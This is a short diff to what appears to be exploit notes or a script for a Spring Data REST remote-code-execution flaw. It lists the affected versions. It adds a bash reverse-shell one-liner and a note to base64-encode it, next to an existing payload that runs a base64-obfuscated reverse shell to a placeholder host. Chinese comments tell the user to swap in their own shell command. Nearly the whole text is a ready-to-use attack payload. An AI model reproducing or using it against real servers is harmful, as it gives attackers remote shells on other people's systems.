@@ -6,6 +6,9 @@ Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3
 Spring Boot version ≤ 2.0.0M4
 Spring Data release trains < Kay-RC3
 ```
+bash -i >& /dev/tcp/ip/port 0>&1
+base64一下：
+
 # 自己改弹shell的命令
 payload = b'bash -c {echo,YmFzaCAtaSAmPi9kZXYvdGNwL3gueC54LngvMjMzMyA8JjE=}|{base64,-d}|{bash,-i}'
 
